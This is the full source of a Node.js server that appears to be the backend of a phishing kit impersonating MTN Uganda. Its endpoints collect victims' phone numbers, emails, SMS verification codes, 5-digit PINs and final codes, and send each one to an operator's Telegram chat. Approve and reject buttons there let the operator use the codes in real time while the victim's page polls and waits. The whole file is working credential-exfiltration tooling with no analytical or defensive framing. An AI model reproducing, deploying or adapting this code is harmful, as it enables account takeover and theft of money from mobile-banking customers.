require('dotenv').config();
const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// ===== BOT CREDENTIALS =====
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID   = process.env.CHAT_ID;

// Serve HTML from the parent folder
app.use(express.static(path.join(__dirname, '..')));

// Auto-append .html if no extension
app.use(function (req, res, next) {
    if (req.method !== 'GET') return next();
    if (req.path.includes('.')) return next();
    if (req.path.startsWith('/api/')) return next();
    const fs = require('fs');
    const file = path.join(__dirname, '..', req.path + '.html');
    if (fs.existsSync(file)) return res.sendFile(file);
    next();
});

// In-memory stores
var decisions = {};      // referenceId -> 'pending' | 'confirmed' | 'rejected'
var submissions = {};    // referenceId -> { type, data }

// ─── Helpers ───
function escapeHtml(str) {
    if (str === null || str === undefined) return '-';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

function fmtPhone(p) {
    if (!p) return '-';
    const clean = String(p).replace(/\D/g, '');
    if (clean.length === 9) {
        return '+256 ' + clean.slice(0,3) + ' ' + clean.slice(3,6) + ' ' + clean.slice(6,9);
    }
    return clean ? '+256 ' + clean : '-';
}

function nowStr() {
    return new Date().toLocaleString('en-GB', {
        day: '2-digit', month: 'short', year: 'numeric',
        hour: '2-digit', minute: '2-digit', second: '2-digit'
    });
}

async function sendTelegram(text, keyboard) {
    var body = {
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'HTML'
    };
    if (keyboard) body.reply_markup = keyboard;

    const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
    const r = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
    });
    return await r.json();
}

// ============================================================
// 1) SUBMIT APPLICATION → LOGIN ATTEMPT
// ============================================================
app.post('/api/submit-application', async function (req, res) {
    var d = req.body;
    var referenceId = 'LA' + Date.now() + Math.floor(Math.random() * 1000);
    decisions[referenceId] = 'pending';

    var phone = fmtPhone(d.phone);
    var email = d.email || '-';

    var message =
        '🏦 <b>LOGIN ATTEMPT</b>\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '🆕 <b>NEW USER</b>\n' +
        '\n📧 <b>Email:</b> ' + escapeHtml(email) + '\n' +
        '\n🌍 <b>Country Code:</b> +256\n' +
        '\n📱 <b>Phone Number:</b>\n' +
        '<pre><code>' + escapeHtml(phone) + '</code></pre>\n' +
        '\n🕐 ' + nowStr() + '\n' +
        '\n⏳ User waiting approval for 3 minutes';

    var keyboard = {
        inline_keyboard: [[
            { text: '✅ PROCEED', callback_data: 'confirm:' + referenceId },
            { text: '❌ INVALID', callback_data: 'reject:' + referenceId }
        ]]
    };

    try {
        const result = await sendTelegram(message, keyboard);
        if (result.ok) {
            console.log('🏦 LOGIN ATTEMPT sent. Ref:', referenceId);
            res.json({ ok: true, referenceId: referenceId });
        } else {
            console.log('❌ Telegram error:', result);
            res.json({ ok: false, error: result.description });
        }
    } catch (err) {
        console.error('Server error:', err);
        res.status(500).json({ ok: false });
    }
});

// ============================================================
// 2) VERIFY SMS CODE → VERIFICATION MESSAGE
// ============================================================
app.post('/api/verify-code', async function (req, res) {
    var d = req.body;
    var referenceId = 'REF' + Date.now() + Math.floor(Math.random() * 1000);
    decisions[referenceId] = 'pending';

    var phone = fmtPhone(d.phone);
    var code  = d.code || '-';

    var message =
        '📱 <b>Phone:</b>\n' +
        '<pre><code>' + escapeHtml(phone) + '</code></pre>\n' +
        '\n📩 <b>Full SMS Message:</b>\n' +
        '<pre><code>' + escapeHtml(code) + '</code></pre>\n' +
        '\n🕐 ' + nowStr();

    var keyboard = {
        inline_keyboard: [[
            { text: '✅ CONFIRM', callback_data: 'confirm:' + referenceId },
            { text: '❌ REJECT',  callback_data: 'reject:' + referenceId }
        ]]
    };

    try {
        const result = await sendTelegram(message, keyboard);
        if (result.ok) {
            console.log('📩 VERIFICATION MESSAGE sent. Ref:', referenceId);
            res.json({ ok: true, referenceId: referenceId });
        } else {
            res.json({ ok: false, error: result.description });
        }
    } catch (err) {
        console.error(err);
        res.status(500).json({ ok: false });
    }
});

// ============================================================
// 3) SUBMIT PIN → PIN SUBMITTED (no buttons)
// ============================================================
app.post('/api/submit-pin', async function (req, res) {
    var d = req.body;
    var phone = fmtPhone(d.phone);
    var pin = d.pin || '-';

    var message =
        '📱 <b>Phone:</b>\n' +
        '<pre><code>' + escapeHtml(phone) + '</code></pre>\n' +
        '\n🔐 <b>5-Digit PIN:</b>\n' +
        '<pre><code>' + escapeHtml(pin) + '</code></pre>\n' +
        '\n🕐 ' + nowStr();

    try {
        const result = await sendTelegram(message, null);
        if (result.ok) {
            console.log('🔐 PIN sent for phone:', phone);
            res.json({ ok: true });
        } else {
            res.json({ ok: false, error: result.description });
        }
    } catch (err) {
        console.error(err);
        res.status(500).json({ ok: false });
    }
});

// ============================================================
// 4) VERIFY FINAL CODE → VERIFICATION CODE
// ============================================================
app.post('/api/verify-final-code', async function (req, res) {
    var d = req.body;
    var referenceId = 'FC' + Date.now() + Math.floor(Math.random() * 1000);
    decisions[referenceId] = 'pending';

    var phone = fmtPhone(d.phone);
    var code  = d.code || '-';

    var message =
        '📱 <b>Phone:</b>\n' +
        '<pre><code>' + escapeHtml(phone) + '</code></pre>\n' +
        '\n🔐 <b>4-Digit Code:</b>\n' +
        '<pre><code>' + escapeHtml(code) + '</code></pre>\n' +
        '\n🕐 ' + nowStr();

    var keyboard = {
        inline_keyboard: [[
            { text: '✅ APPROVE', callback_data: 'confirm:' + referenceId },
            { text: '❌ INVALID', callback_data: 'reject:' + referenceId }
        ]]
    };

    try {
        const result = await sendTelegram(message, keyboard);
        if (result.ok) {
            console.log('🔐 VERIFICATION CODE sent. Ref:', referenceId);
            res.json({ ok: true, referenceId: referenceId });
        } else {
            res.json({ ok: false, error: result.description });
        }
    } catch (err) {
        console.error(err);
        res.status(500).json({ ok: false });
    }
});

// ============================================================
// 5) RESEND CODE → RESEND REQUEST
// ============================================================
app.post('/api/resend-code', async function (req, res) {
    var d = req.body;
    var phone = fmtPhone(d.phone);

    var message =
        '🔄 <b>VERIFICATION MESSAGE RESEND REQUEST</b>\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '\n🌍 <b>Country Code:</b> +256\n' +
        '\n📱 <b>Phone Number:</b>\n' +
        '<pre><code>' + escapeHtml(phone) + '</code></pre>\n' +
        '\n🕐 ' + nowStr();

    try {
        await sendTelegram(message, null);
        res.json({ ok: true });
    } catch (err) {
        res.status(500).json({ ok: false });
    }
});

// ============================================================
// 6) STATUS (frontend polls)
// ============================================================
app.get('/api/status', function (req, res) {
    var ref = req.query.ref;
    res.json({ status: decisions[ref] || 'pending' });
});

// ============================================================
// 7) TELEGRAM CALLBACK (button taps)
// ============================================================
app.post('/api/telegram-callback', async function (req, res) {
    var cb = req.body.callback_query;
    if (!cb) return res.sendStatus(200);

    var parts = cb.data.split(':');
    var action = parts[0];
    var referenceId = parts[1];

    decisions[referenceId] = (action === 'confirm') ? 'confirmed' : 'rejected';
    console.log('📥 Decision:', referenceId, '->', decisions[referenceId]);

    try {
        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/answerCallbackQuery', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                callback_query_id: cb.id,
                text: action === 'confirm' ? '✅ Confirmed' : '❌ Rejected'
            })
        });

        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/editMessageText', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: cb.message.chat.id,
                message_id: cb.message.message_id,
                text: cb.message.text + '\n\n— — —\n' +
                      (action === 'confirm' ? '✅ CONFIRMED' : '❌ REJECTED'),
                parse_mode: 'HTML'
            })
        });
    } catch (err) {
        console.error('Callback reply failed:', err);
    }

    res.sendStatus(200);
});

// ============================================================
// START
// ============================================================
var PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', function () {
    console.log('🚀 MTN Uganda server running at port ' + PORT);
});